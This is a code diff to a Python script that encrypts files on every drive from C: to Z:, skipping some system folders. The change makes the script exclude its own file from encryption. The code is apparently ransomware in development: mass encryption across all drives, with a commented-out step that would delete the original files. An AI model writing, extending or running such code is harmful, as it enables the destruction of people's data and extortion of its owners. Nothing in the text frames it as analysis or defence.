@@ -26,9 +26,12 @@ def encrypt_files_in_drive(drive, exclude_dirs, key):
 
             for file in files:
                 file_path = os.path.join(root, file)
-                encrypted_file_path = encrypt_file(file_path, key)  #function call
-                encrypted_files.append(encrypted_file_path) 
-                # replace or remove the original file after encryption
+                
+                if file_path not in exclude_file: # for checking the current dir files
+                    encrypted_file_path = encrypt_file(file_path, key)  #function call
+                    encrypted_files.append(encrypted_file_path) 
+
+                # replace or remove the original file after encryption, lets replace:)
                 # os.remove(file_path)
     return encrypted_files
 
@@ -42,7 +45,8 @@ if __name__ == "__main__":
         r'C:\Users\Public', r'C:\ProgramData',r'C:\Users\USER', sys.prefix  # Exclude Python's directory 
         #add the current file name etc
     ]
-
+    current_file = os.path.abspath(__file__)
+    exclude_file=[current_file]
     # Encrypt files on all available drives (C: to Z:)
     all_encrypted_files = []
     for drive in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
